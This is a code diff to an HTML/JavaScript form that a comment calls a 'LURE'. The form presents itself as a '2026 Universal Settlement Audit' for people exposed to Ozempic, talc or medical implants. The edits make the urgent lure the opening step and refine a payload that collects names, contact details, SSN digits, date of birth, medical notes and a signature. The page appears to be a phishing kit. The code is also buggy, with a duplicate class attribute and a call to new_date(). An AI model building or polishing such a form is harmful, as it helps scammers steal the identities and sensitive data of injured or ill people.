@@ -125,7 +125,7 @@
         <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
 
         <!-- STEP 0: WELCOME / LURE -->
-        <div class="step" id="step0">
+        <div class="step" id="step0" class="step active">
             <h2>⚖️ 2026 Universal Settlement Audit: Critical Notice</h2>
             <p><strong>Attention:</strong> If you or a loved one were exposed to GLP-1 Agonists (Ozempic), Talcum powder, or defective medical implants, the window for <strong>Tier 1 Settlement Eligibility</strong> is rapidly narrowing.</p>
             
@@ -157,7 +157,7 @@
 
     <!-- STEP 1: IDENTITY -->
 
-    <div class="step active" id="step1">
+    <div class="step" id="step1">
 
         <h2>Claimant Verification</h2>
 
@@ -657,23 +657,20 @@
         
 
         const payload = {
-    first_name: document.getElementById('first_name').value,
-    last_name: document.getElementById('last_name').value,
-    email: document.getElementById('email').value,
-    phone: document.getElementById('phone').value,
-    zip_code: document.getElementById('zip_code').value,
-    
-    // ADD THESE TWO LINES:
-    ssn_last_4: document.getElementById('ssn').value, 
-    date_of_birth: document.getElementById('dob').value,
-
-    case_type: document.getElementById('case_type').value,
-    audit_metadata: dynamicData,
-    pathology_impression: document.getElementById('pathology').value,
-    signature_base64: signaturePad.toDataURL(),
-    apollo_form_id: document.getElementById('apollo_form_id').value,
-    submitted_at: new Date().toISOString()
-};
+        first_name: document.getElementById('first_name').value,
+        last_name: document.getElementById('last_name').value,
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        zip_code: document.getElementById('zip_code').value,
+        ssn_last_4: document.getElementById('ssn').value, 
+        date_of_birth: document.getElementById('dob').value,
+        case_type: document.getElementById('case_type').value,
+        audit_metadata: JSON.stringify(dynamicData), 
+        pathology_impression: document.getElementById('pathology').value,
+        signature_base64: signaturePad.toDataURL(),
+        apollo_form_id: document.getElementById('apollo_form_id').value,
+        submitted_at: new_date().toISOString()
+    }
 
         
 
